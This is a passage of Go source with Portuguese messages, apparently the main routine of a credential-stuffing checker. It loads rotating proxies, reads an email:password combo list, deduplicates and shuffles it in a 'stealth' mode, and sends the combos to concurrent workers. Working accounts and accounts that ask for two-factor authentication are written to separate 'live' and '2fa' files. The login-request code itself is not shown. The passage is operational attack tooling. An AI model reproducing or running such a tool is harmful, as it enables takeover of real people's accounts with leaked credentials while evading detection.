		if err := loadProxies(proxiesFile); err != nil {
			fmt.Fprintf(os.Stderr, "Erro ao carregar proxies: %v\n", err)
			os.Exit(1)
		}
		go proxyHealthCheck()
		logg.Info("Proxies carregados", map[string]interface{}{"count": len(proxyList)})
	}

	f, err := os.OpenFile(livePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Erro ao abrir %s: %v\n", livePath, err)
		os.Exit(1)
	}
	liveFile = f
	defer func() {
		liveFile.Sync()
		liveFile.Close()
	}()

	tf, err := os.OpenFile(twofaPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Erro ao abrir %s: %v\n", twofaPath, err)
		os.Exit(1)
	}
	twofaFile = tf
	defer func() {
		twofaFile.Sync()
		twofaFile.Close()
	}()

	globalCtx, cancelCtx = context.WithCancel(context.Background())
	defer cancelCtx()
	setupSignals()
	stats.start = time.Now()

	jobs := make(chan Combo, threads*2)
	wg.Add(threads)
	for i := 0; i < threads; i++ {
		go worker(i, jobs)
	}

	file, err := os.Open(comboPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Erro ao abrir combos: %v\n", err)
		cancelCtx()
		wg.Wait()
		os.Exit(1)
	}
	defer file.Close()

	seenCombos := make(map[string]struct{})
	if stealthMode {
		var all []Combo
		scanner := bufio.NewScanner(file)
		scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			parts := strings.SplitN(line, comboSep, 2)
			if len(parts) != 2 {
				continue
			}
			combo := Combo{Email: parts[0], Password: parts[1]}
			if _, exists := seenCombos[combo.Email+":"+combo.Password]; exists {
				continue
			}
			seenCombos[combo.Email+":"+combo.Password] = struct{}{}
			all = append(all, combo)
		}
		scanner.Err()
		rng.Shuffle(len(all), func(i, j int) { all[i], all[j] = all[j], all[i] })
		go func() {
			defer close(jobs)
			for _, c := range all {
				select {
				case jobs <- c:
				case <-globalCtx.Done():
					return
				}
			}
		}()
	} else {
		scanner := bufio.NewScanner(file)
		scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		go func() {
			defer close(jobs)
			for scanner.Scan() {
				line := strings.TrimSpace(scanner.Text())
				if line == "" || strings.HasPrefix(line, "#") {
					continue
				}
				parts := strings.SplitN(line, comboSep, 2)
				if len(parts) != 2 {
					continue
				}
				combo := Combo{Email: parts[0], Password: parts[1]}
				if _, exists := seenCombos[combo.Email+":"+combo.Password]; exists {
					continue
				}
				seenCombos[combo.Email+":"+combo.Password] = struct{}{}
				select {
				case jobs <- combo:
				case <-globalCtx.Done():
					return
				}
			}
		}()
	}

	wg.Wait()

	if showStats {
		fmt.Fprintf(os.Stderr, "%s\n", stats.String())
	}
}
